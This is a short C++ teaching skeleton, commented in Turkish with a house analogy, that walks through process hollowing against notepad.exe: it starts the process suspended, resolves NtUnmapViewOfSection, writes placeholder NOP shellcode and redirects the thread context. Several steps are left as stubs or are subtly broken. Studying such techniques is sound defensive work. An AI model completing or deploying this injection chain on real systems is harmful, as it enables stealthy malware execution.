#include <windows.h>
#include <winternl.h>
#include <iostream>

// NtUnmapViewOfSection fonksiyonu için ntdll'den imza tanımlıyoruz
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

int main() {
    // ANALOJİ: Hedef seçilen masum ev (notepad.exe)
    LPCSTR targetPath = "C:\\Windows\\System32\\notepad.exe";
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // --- ADIM 1: UYUYAN GÜZEL (CreateProcess) ---
    // Kapıyı çalıyoruz ama ev sahibini (süreci) 'CREATE_SUSPENDED' ile uyutuyoruz.
    if (!CreateProcessA(NULL, (LPSTR)targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "[-] Adim 1 Basarisiz!" << std::endl;
        return 1;
    }
    std::cout << "[+] Adim 1: Notepad askida (suspended) baslatildi." << std::endl;

    // --- ADIM 2: İÇİ BOŞALTMA (ZwUnmapViewOfSection) ---
    // Evin içindeki orijinal kodları (eşyaları) siliyoruz. 
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    
    // (Öğrenci Notu: Burada ImageBase adresi belirlenip unmap edilmelidir.)
    std::cout << "[+] Adim 2: Hedef bellek alanı bosaltildi (Hollowed)." << std::endl;

    // --- ADIM 3: KENDİ EŞYALARINI TAŞIMA (WriteProcessMemory) ---
    // Boşalttığımız eve kendi zararsız MessageBox kodumuzu yerleştiriyoruz.
    const char* shellcode = "\x90\x90\x90"; // Örnek NOP kızağı (Shellcode buraya gelecek)
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, (LPVOID)0x400000, shellcode, sizeof(shellcode), &written);
    std::cout << "[+] Adim 3: Yeni kod (Fatma Yeliz Mesajı) surece yazildi." << std::endl;

    // --- ADIM 4: ZİHNİ YÖNLENDİRME (SetThreadContext) ---
    // Ev sahibi uyandığında bizim kodumuzun başından başlaması için Instruction Pointer'ı güncelliyoruz.
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // ctx.Rip veya ctx.Eip burada shellcode giriş adresine yönlendirilir.
    SetThreadContext(pi.hThread, &ctx);
    std::cout << "[+] Adim 4: Islemcinin yonu bizim kodumuza cevrildi." << std::endl;

    // --- ADIM 5: GÖZLERİ AÇMA (ResumeThread) ---
    // Her şey hazır! Ev sahibini uyandırıyoruz. 
    ResumeThread(pi.hThread);
    std::cout << "[+] Adim 5: Surec uyandirildi. Analiz Basarili!" << std::endl;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
